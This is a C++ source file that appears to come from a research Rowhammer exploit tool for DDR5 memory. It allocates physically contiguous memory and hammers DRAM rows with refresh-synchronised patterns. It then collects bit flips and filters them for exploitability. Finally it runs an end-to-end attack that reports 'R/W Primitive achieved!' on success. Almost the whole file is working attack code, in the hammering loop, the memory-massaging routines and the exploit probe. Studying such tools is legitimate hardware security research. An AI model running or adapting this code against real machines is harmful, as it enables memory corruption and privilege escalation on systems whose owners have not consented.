#include "hammer.hpp"

#include "allocation_4mb.hpp"

#include <ctime> // time, localtime, strftime
#include <sys/wait.h>

#include <random>

#include <algorithm>
#include <limits>

#include <cmath>
#include <filesystem>
#include <fstream>
#include <immintrin.h>
#include <indicators/progress_bar.hpp>
#include <iostream>
#include <mutex>
#include <thread>
#include <vector>


#include "gen_rows.hpp"
#include "hammer/args.hpp"
#include "hammer/bit_flips.hpp"
#include "hammer/jitted.hpp"
#include "lowutils.hpp"
#include "pagemap.hpp"
#include "rubicon.h"
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <sys/mman.h>
#include <unistd.h>

#include <cstring>
#include <fcntl.h>
#include <iomanip>
#include <sys/mman.h>
#include <unordered_set>

namespace fs = std::filesystem;

static int num_tries = 1;


std::vector<uint64_t> g_tsc_ref_times;
std::vector<volatile uint64_t*> g_sync_rows_storage;
volatile uint64_t** g_sync_rows;
int g_num_sync_rows;
size_t g_ref_threshold;

uint64_t ref_sync() {
    int i = 0;
    while(true) {
        const uint64_t prev = rdtscp();
        *(g_sync_rows[i]);
        const uint64_t curr = rdtscp();
        auto t_measured     = curr - prev;
        _mm_clflushopt((void*)g_sync_rows[i]);
        if(t_measured > g_ref_threshold) {
            return curr;
        }
        i = (i + 1) % g_num_sync_rows;
    }
}

uint64_t global_ref_sync() {
    uint64_t prev = rdtscp();
    int i         = 0;
    while(true) {
        *(g_sync_rows[i]);
        _mm_clflushopt((void*)g_sync_rows[i]);
        uint64_t curr = rdtscp();
        if((curr - prev) > g_ref_threshold) {
            return curr;
        }
        prev = curr;
        i    = (i + 1) % g_num_sync_rows;
    }
}

void set_thread_affinity(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
}

std::string make_timestamped_filename(const std::string& suffix) {
    using clock       = std::chrono::system_clock;
    auto now          = clock::now();
    std::time_t now_c = clock::to_time_t(now);

    std::tm tm_local{};
    localtime_r(&now_c, &tm_local);

    char buf[32];
    std::strftime(buf, sizeof buf, "%Y%m%d-%H%M%S_", &tm_local);

    return std::string{ buf } + suffix;
}

void write_sync_timestamps(const std::vector<uint64_t>& tsc_ref_times,
                           const std::filesystem::path& filepath) {
    namespace fs = std::filesystem;

    /* sanity check ------------------------------------------------------- */
    if(tsc_ref_times.empty()) {
        return;
    }
    if(tsc_ref_times.size() & 1) { // must be an even count
        std::cerr << "[-] Vector has an odd number of elements ("
                  << tsc_ref_times.size() << "); expected pairs!\n";
        return;
    }

    /* 1. make sure the parent directory exists --------------------------- */
    if(!filepath.empty()) {
        create_directories(filepath.parent_path());
    }

    /* 2. open file (overwrite each run, not append) ---------------------- */
    std::ofstream out{ filepath, std::ios::out | std::ios::trunc };
    if(!out) {
        std::cerr << "[-] Could not open “" << filepath.string() << "” for writing!\n";
        return;
    }

    /* 3. CSV header ------------------------------------------------------ */
    out << "access_burst_index,tsc,tsc_diff\n";

    /* 4. dump pairs + diff ---------------------------------------------- */
    uint64_t prev_tsc = 0; // meaningless for the first row
    bool first        = true;

    for(std::size_t i = 1; i < tsc_ref_times.size(); i += 2) {
        uint64_t tsc                = tsc_ref_times[i];
        uint64_t access_burst_index = tsc_ref_times[i + 1];

        uint64_t diff = first ? 0 : (tsc - prev_tsc);
        first         = false;
        prev_tsc      = tsc;

        out << access_burst_index << ',' << tsc << ',' << diff << '\n';
    }
}

std::string make_timestamp() {
    using clock = std::chrono::system_clock;

    const std::time_t t_c = clock::to_time_t(clock::now());

    std::tm tm_local{};
    localtime_r(&t_c, &tm_local); // POSIX-only

    char buf[16]; // "YYYYMMDD_HHMMSS" + '\0'
    std::strftime(buf, sizeof buf, "%Y%m%d_%H%M%S", &tm_local);
    return buf; // std::string conversion
}

void prepare_results_path(hammer_params_t& params) {
    namespace fs = std::filesystem;

    if(params.results_path.empty()) {
        params.results_path = fs::path("./results") / make_timestamp();
    }

    create_directories(params.results_path);
}

static const std::unordered_map<std::string, hammer_fn_t> kHammerFnRegistry = {
    { "self_sync", &hammer_jitted_self_sync },
    { "seq_sync", &hammer_jitted_seq_sync }
};

hammer_fn_t resolve_hammer_fn(const std::string& name) {
    auto it = kHammerFnRegistry.find(name);
    if(it == kHammerFnRegistry.end()) {
        throw std::invalid_argument("unknown pattern: " + name);
    }
    return it->second;
}

static const std::unordered_map<std::string, bank_pattern_builder_t> kPatternRegistry = {
    { "skh_mod128_parallel", &assemble_skh_mod128_pattern_parallel },
    { "skh_mod128_single", &assemble_skh_mod128_pattern_single },
    { "skh_mod2608", &assemble_skh_mod2608_pattern }
};

bank_pattern_builder_t resolve_pattern_builder(const std::string& name) {
    auto it = kPatternRegistry.find(name);
    if(it == kPatternRegistry.end()) {
        throw std::invalid_argument("unknown pattern: " + name);
    }
    return it->second;
}


std::vector<dram_address> get_sync_rows(const hammer_params_t& params) {
    std::vector<dram_address> addresses;
    addresses.reserve(params.num_sync_rows);

    int row = params.sync_base_row;

    for(std::size_t r = 0; r < params.num_sync_rows; ++r) {
        for(int sc : params.subchannels) {
            for(int rk : params.ranks) {
                for(int bg : params.bank_groups) {
                    for(int bk : params.banks) {
                        addresses.emplace_back(sc, rk, bg, bk, row, 0);
                    }
                }
            }
        }

        row++;
    }

    addresses.resize(params.num_sync_rows);
    return addresses;
}


constexpr uint64_t kVictimPatternBase = 0x8000000000000027ULL;
constexpr uint64_t kRandomBits        = 24;
constexpr unsigned kShift             = 12; // put them at bits 12-35
constexpr uint64_t kRandomMask        = (1ULL << kRandomBits) - 1;

uint64_t make_random_victim_pattern() {
    static std::mt19937_64 rng{ std::random_device{}() }; // one PRNG for the whole run
    std::uniform_int_distribution<uint64_t> dist(0, kRandomMask);

    uint64_t rnd = dist(rng); // 0 … 0xFFFFFF
    return kVictimPatternBase | (rnd << kShift);
}


static allocation alloc;

void initialize_block(void* block, size_t block_size) {
    std::memset(block, 0xAA, block_size);

    if(mlock(block, block_size) < 0) {
        perror("mlock");
    }

    if(!alloc.set_4mb_block(block)) {
        throw std::runtime_error("alloc.allocate() failed");
    }

    dram_address::initialize(std::move(alloc));

    auto mem = dram_address::alloc().ptr();
    if(mem == nullptr) {
        throw std::bad_alloc();
    }
}

struct slice_stat_t {
    void* va;
    uint64_t cycles;
};

using slice_work_t = uint64_t (*)(void* slice_va, size_t slice_sz);

struct jump_result_t {
    uint64_t threshold; // cycles separating fast/slow
    uint64_t max_gap;   // the gap we used to set the threshold

    size_t enter_idx; // first slice above threshold
    void* enter_va;
    uint64_t enter_cycles;

    size_t leave_idx; // first slice back below threshold
    void* leave_va;
    uint64_t leave_cycles;

    bool found; // false → never left fast band
};

uint64_t time_addresses(volatile char* a_star, volatile char* a) {
    unsigned long t0 = rdtscp();
    _mm_lfence();

    /* We check if the average access time of BANK_CONFLICT_ROUNDS rounds
     * exceeds threshold.  */
    for(int i = 0; i < 10; i++) {
        _mm_clflushopt((void*)a_star);
        _mm_clflushopt((void*)a);
        _mm_mfence();
        *a_star;
        *a;
    }
    return (rdtscp() - t0) / 10;
}

/**
 * Scan every bank-group / bank pair and every row-pair (row 0 vs row 1…15)
 * inside the same sub-array.  Return the *fastest* row-pair access latency
 * (in CPU cycles) that we observe.
 *
 * The function assumes:
 *   • dram_address::to_virt() yields a cache-line–aligned address;
 *   • time_addresses(p0, p1) measures the latency of some access pattern
 *     that exercises the DRAM row buffer, and returns a cycle count.
 */
static uint64_t measure_min_rowpair_latency() {
    constexpr int kBankGroups  = 8;  // BG0-BG7
    constexpr int kBanks       = 4;  // BK0-BK3
    constexpr int kRowsPerTest = 16; // compare row 0 with rows 1-15

    uint64_t min_access_time = std::numeric_limits<uint64_t>::max();

    for(int bg = 0; bg < kBankGroups; ++bg) {
        for(int bk = 0; bk < kBanks; ++bk) {
            for(int row = 1; row < kRowsPerTest; ++row) {

                dram_address da0(0, 0, bg, bk, 0, 0);
                dram_address da1(0, 0, bg, bk, row, 0);

                /*  Cast to volatile so the compiler doesn’t optimise
                 *  the loads/stores away.                                */
                auto a0 = da0.to_virt();
                auto a1 = da1.to_virt();

                uint64_t t      = time_addresses(a0, a1);
                min_access_time = std::min(min_access_time, t);
            }
        }
    }
    return min_access_time;
}

static jump_result_t find_latency_jump_in_block(void* block_base,
                                                const size_t block_sz, // 8 MiB
                                                const size_t slice_sz  // 4 MiB
) {
    const size_t step = 4096;                             // 4 KiB
    const size_t n    = (block_sz - slice_sz) / step + 1; // inclusive

    std::vector<slice_stat_t> stats;
    stats.reserve(n);

    /* 1. collect ------------------------------------------------------ */
    for(size_t off = 0; off <= block_sz - slice_sz; off += step) {
        void* va = static_cast<char*>(block_base) + off;

        initialize_block(va, slice_sz);
        uint64_t cyc = measure_min_rowpair_latency();
        stats.push_back({ va, cyc });
    }
    if(stats.size() < 2)
        return { 0, 0, 0, nullptr, 0, 0, nullptr, 0, false };

    /* 2. auto-threshold ---------------------------------------------- */
    std::vector<uint64_t> sorted;
    sorted.reserve(stats.size());
    for(auto& s : stats)
        sorted.push_back(s.cycles);
    std::sort(sorted.begin(), sorted.end());

    size_t gap_idx   = 0;
    uint64_t max_gap = 0;
    for(size_t i = 1; i < sorted.size(); ++i) {
        uint64_t g = sorted[i] - sorted[i - 1]; // non-negative
        if(g > max_gap) {
            max_gap = g;
            gap_idx = i;
        }
    }
    uint64_t thresh = sorted[gap_idx - 1] + max_gap / 2;

    // std::printf("Auto-threshold %llu cycles (gap %llu between %llu and %llu)\n",
    //             (unsigned long long)thresh, (unsigned long long)max_gap,
    //             (unsigned long long)sorted[gap_idx - 1],
    //             (unsigned long long)sorted[gap_idx]);

    /* 3. walk in time order & fill result ----------------------------- */
    jump_result_t res{};
    res.threshold = thresh;
    res.max_gap   = max_gap;
    res.found     = false;

    bool in_slow = false;
    for(size_t i = 0; i < stats.size(); ++i) {
        uint64_t c = stats[i].cycles;

        if(!in_slow && c > thresh) { /* enter slow */
            in_slow          = true;
            res.found        = true;
            res.enter_idx    = i;
            res.enter_va     = stats[i].va;
            res.enter_cycles = c;
            // std::printf(">>> latency jump starts  at slice %-4zu VA=%p  %llu "
            //             "cy\n",
            //             i, res.enter_va, (unsigned long long)c);
        } else if(in_slow && c <= thresh) { /* leave slow */
            in_slow          = false;
            res.leave_idx    = i;
            res.leave_va     = stats[i].va;
            res.leave_cycles = c;
            // std::printf("<<< latency back normal at slice %-4zu VA=%p  %llu "
            //             "cy\n",
            //             i, res.leave_va, (unsigned long long)c);
            break; // stop after first band
        }
    }
    return res;
}

void* allocate_memory() {
    constexpr size_t eight_mib   = 8ULL << 20;
    constexpr size_t four_mib    = 4ULL << 20;
    constexpr uintptr_t fixed_va = 0x100000000UL;

    /* 1.  Get one physically-contiguous 8 MiB block. */
    void* block = acquire_contiguous_page_block2(eight_mib);

    /* 2.  Sweep it and detect the latency jump. */
    jump_result_t jr = find_latency_jump_in_block(block, eight_mib, four_mib);
    while(!jr.found) {
        jr = find_latency_jump_in_block(block, eight_mib, four_mib);
    }

    void* source_va = nullptr;
    if(jr.enter_idx != 0) {
        source_va = jr.enter_va;
    } else {
        // If the jr.enter_idx is 0, then the start of the block contains part
        // of a 4MB block. In that case, we locate the end of it and find the
        // next 4 MB block in the 8MB buffer.
        source_va = (void*)((uintptr_t)jr.leave_va + four_mib - (63 * 4096));
    }

    // printf("  selected slice VA %p  (enter_idx=%zu, leave_idx=%zu)\n",
    //        source_va, jr.enter_idx, jr.leave_idx);

    // printf("\nSummary:\n"
    //        "  threshold                : %llu cycles\n"
    //        "  jump entered @idx=%2zu  VA=%p  %llu cy\n"
    //        "  jump left    @idx=%2zu  VA=%p  %llu cy\n"
    //        "  slice to move            : VA=%p\n\n",
    //        static_cast<unsigned long long>(jr.threshold), jr.enter_idx, jr.enter_va,
    //        static_cast<unsigned long long>(jr.enter_cycles), jr.leave_idx,
    //        jr.leave_va, static_cast<unsigned long long>(jr.leave_cycles), source_va);

    /* 4.  Move the 4 MiB slice to the fixed virtual address ------------ */

    /* make sure the destination window is free */
    munmap(reinterpret_cast<void*>(fixed_va), four_mib); // ignore ENOMEM/ENOENT

    void* moved = mremap(source_va,                     /* source VA          */
                         four_mib, four_mib,            /* old/new size       */
                         MREMAP_FIXED | MREMAP_MAYMOVE, /* move, unmap src */
                         reinterpret_cast<void*>(fixed_va));

    if(moved == MAP_FAILED) {
        perror("mremap-to-fixed");
        return MAP_FAILED;
    }

    /* 5.  Trim the two leftover fragments of the old 8 MiB mapping ---- */

    uintptr_t block_u   = reinterpret_cast<uintptr_t>(block);
    uintptr_t slice_u   = reinterpret_cast<uintptr_t>(source_va);
    uintptr_t slice_end = slice_u + four_mib;
    uintptr_t block_end = block_u + eight_mib;

    if(slice_u > block_u) /* leading fragment */
        munmap(reinterpret_cast<void*>(block_u), slice_u - block_u);

    if(block_end > slice_end) /* trailing fragment */
        munmap(reinterpret_cast<void*>(slice_end), block_end - slice_end);

    // printf("[+] 4 MiB slice now parked at fixed VA %p (old mapping "
    //        "removed)\n",
    //        moved);

    return moved;
}

bool is_same_repeatable_flip(const bit_flip_info_t& a, const bit_flip_info_t& b) {
    return a.address == b.address && a.flipped_mask == b.flipped_mask;
}
#define PAGE_SIZE 4096

#define align(value, alignment) ((value) & ~((alignment)-1))
#define align_ptr_to_page(addr) \
    (reinterpret_cast<void*>(align(reinterpret_cast<uintptr_t>(addr), PAGE_SIZE)))

void* flip_bit(void* addr, unsigned pos) {
    auto v = reinterpret_cast<uintptr_t>(addr);
    v ^= (1ULL << pos);
    return reinterpret_cast<void*>(v);
}

inline void print_ptr_hex(const char* label, void* ptr) {
    std::ios old_state(nullptr);
    old_state.copyfmt(std::cout); // save caller’s formatting

    std::cout << label << ": 0x" << std::hex << std::setw(sizeof(uintptr_t) * 2)
              << std::setfill('0') << reinterpret_cast<uintptr_t>(ptr) << '\n';

    std::cout.copyfmt(old_state); // restore formatting
}

std::vector<volatile char*> collect_unique_pages(const std::vector<dram_address>& addresses) {
    std::unordered_set<volatile char*> unique;
    unique.reserve(addresses.size());

    for(const auto address : addresses) {
        auto address_page = (volatile char*)align_ptr_to_page(address.to_virt());
        unique.insert(address_page);
    }

    std::vector<volatile char*> pages(unique.begin(), unique.end());
    std::sort(pages.begin(), pages.end());
    return pages;
}

static bool run_single_probe(volatile uint64_t* victim, size_t offset) {
    static volatile uint8_t probe_flag = 0;

    int status;
    pid_t pid = vfork();
    if(pid == 0) { /* -------- child -------- */
        volatile uint64_t* ptr = (volatile uint64_t*)&victim[offset >> 12];

        _mm_clflushopt((void*)ptr);
        _mm_sfence();

        uint64_t val = *ptr; /* may SIGSEGV / SIGBUS    */

        if((val & 0xffu) == 0x27u)
            probe_flag = 1; /* tell the parent         */

        _exit(0); /* async-signal-safe       */
    }

    /* -------- parent resumes here -------- */
    waitpid(pid, &status, 0);

    if(WIFSIGNALED(status)) {
        printf("Child crashed with signal %d (%s)\n", WTERMSIG(status),
               strsignal(WTERMSIG(status)));
        return false;
    }

    if(probe_flag == 1) {
        puts("R/W Primitive achieved!");
        return true;
    }
    return false;
}


void lock_pages(const std::vector<volatile char*>& aggressor_pages) {
    for(auto page : aggressor_pages) {
        mlock((void*)page, PAGE_SIZE);
    }
}

static inline void write_bit_flips_csv(std::ofstream& csv,
                                       const std::vector<bit_flip_info_t>& flips,
                                       std::uint64_t elapsed_ms,
                                       std::string_view tag) {
    using std::dec;
    using std::hex;
    using std::noshowbase;
    using std::nouppercase;
    using std::showbase;
    using std::uppercase;

    for(const auto& bf : flips) {
        csv << elapsed_ms << ',' // time-since-start [ms] – decimal on purpose
            << tag
            << ','
            // everything that follows is hexadecimal with 0x prefix
            << showbase << uppercase << hex << (uint64_t)(bf.address.to_virt())
            << ',' << (bf.corrupted_value) << ','
            << (bf.flipped_mask)

            // restore default formatting for the next iteration / caller
            << nouppercase << noshowbase << dec << '\n';
    }
    csv.flush(); // keep file live in case of a crash
}

void hammer(hammer_params_t& params) {

    set_thread_affinity(params.core);

    prepare_results_path(params);

    const fs::path bit_flips_path = params.results_path / "bit_flips.csv";

    std::ofstream csv(bit_flips_path, std::ios::out | std::ios::trunc);
    if(!csv) {
        throw std::runtime_error("Cannot open " + bit_flips_path.string());
    }

    auto experiment_start = std::chrono::steady_clock::now();
    csv << "elapsed_ms,category,vaddr_hex,corrupted_value_hex,flip_mask_hex\n";

    printf("[+] Allocating 4MiB contiguous memory blocks.\n\n");
    for(int i = 0; i < params.num_allocations; i++) {
        void* block = allocate_memory();
        initialize_block(block, 4UL << 20);

        /* 4. Normal path: translate and log. */
        // std::cout << "[+] Mapped 0x" << std::hex << dram_address::alloc().size()
        //           << " Bytes at vaddr=0x" << reinterpret_cast<uint64_t>(block)
        //           << std::dec << '\n';

        void* pageblock   = dram_address::alloc().ptr();
        std::size_t bytes = alloc.size();

        auto sync_rows_dram_addresses = get_sync_rows(params);

        g_sync_rows_storage = convert_addresses_to_virtual(sync_rows_dram_addresses);
        g_num_sync_rows = g_sync_rows_storage.size();
        g_sync_rows     = g_sync_rows_storage.data();
        g_ref_threshold = params.ref_threshold;

        int row_base_offset = params.aggressor_row_base_offset;
        int column_stride   = params.column_stride;

        hammer_fn_t hammer_fn     = resolve_hammer_fn(params.hammer_fn_name);
        auto bank_pattern_builder = resolve_pattern_builder(params.pattern_name);

        auto synchronization_pages = collect_unique_pages(sync_rows_dram_addresses);
        // std::cout << "synchronization pages: " << synchronization_pages.size() << std::endl;

        printf("*** ATTACK TRY #%d ***\n", num_tries);
        printf("[+] Templating memory for Rowhammer bit flips...\n");
        for(int pattern = 1; pattern <= params.num_patterns; pattern++) {

            for(int self_sync_threshold = params.sync_min_cycles;
                self_sync_threshold <= params.sync_max_cycles;
                self_sync_threshold += params.sync_step_cycles) {
                for(int reads_per_trefi = params.reads_per_trefi_min;
                    reads_per_trefi <= params.reads_per_trefi_max;
                    reads_per_trefi += params.reads_per_trefi_step) {

                    auto pat = assemble_multi_bank_pattern(
                        bank_pattern_builder, params.subchannels, params.ranks,
                        params.bank_groups, params.banks, row_base_offset,
                        reads_per_trefi, column_stride, params.burst_rotate,
                        params.aggressor_row_offset_increment);

                    auto aggressors = pattern_aggressors(pat);
                    auto victims    = pattern_victims(pat);

                    constexpr uint64_t pattern_aggr = 0x80000000AAAAAA27ULL;
                    constexpr uint64_t pattern_vict = 0x8000000055555527ULL;
                    initialize_data_pattern(aggressors, pattern_aggr);
                    initialize_data_pattern(victims, pattern_vict);
                    _mm_sfence();

                    for(int k = 0; k < params.hammer_rounds; k++) {
                        hammer_fn(pat, params.refs_per_hammer, self_sync_threshold);
                    }

                    std::vector<bit_flip_info_t> bit_flips =
                        collect_bit_flips(victims, pattern_vict);
                    // std::cout << " bit flips: " << bit_flips.size() << '\n';

                    // if(!bit_flips.empty()) {
                    //     std::cout << " bit flips: " << bit_flips.size() << '\n';
                    // }

                    auto aggressor_pages = collect_unique_pages(aggressors);
                    // std::cout << "aggressor pages: " << aggressor_pages.size() << '\n';

                    auto victim_pages = collect_unique_pages(victims);
                    // std::cout << "victim pages: " << victim_pages.size() << '\n';

                    Rubicon rubicon;
                    auto filtered = rubicon.filter_exploitable(bit_flips);
                    // ────── log EXPLOITABLE (surviving) bit-flips ──────
                    if(!filtered.empty()) {
                        auto now_ms =
                            std::chrono::duration_cast<std::chrono::milliseconds>(
                                std::chrono::steady_clock::now() - experiment_start)
                                .count();
                        write_bit_flips_csv(csv, filtered, now_ms, "exploitable");
                    }

                    auto exploitable_bit_flips = filtered;
                    // rubicon.repeatable_bit_flips_data(hammer_fn, pat, params.refs_per_hammer,
                    //                              self_sync_threshold, filtered, 5);

                    if(!exploitable_bit_flips.empty()) {
                        std::cout << "[+] Found "
                            << exploitable_bit_flips.size()
                            << " repeatable and exploitable bit flips."
                            << '\n';

                        auto now_ms =
                            std::chrono::duration_cast<std::chrono::milliseconds>(
                                std::chrono::steady_clock::now() - experiment_start)
                                .count();
                        write_bit_flips_csv(csv, exploitable_bit_flips, now_ms, "repeatable");

                        rubicon.e2e(hammer_fn, pat, params.refs_per_hammer,
                                    self_sync_threshold, aggressor_pages,
                                    synchronization_pages, exploitable_bit_flips,
                                    params.repeatable_hammer_rounds);
                        num_tries++;
                    }
                }
            }
            row_base_offset++;
            if(row_base_offset > params.aggressor_row_base_limit) {
                row_base_offset = params.aggressor_row_base_offset;
            }
        }

        munmap(pageblock, bytes);
    }
}
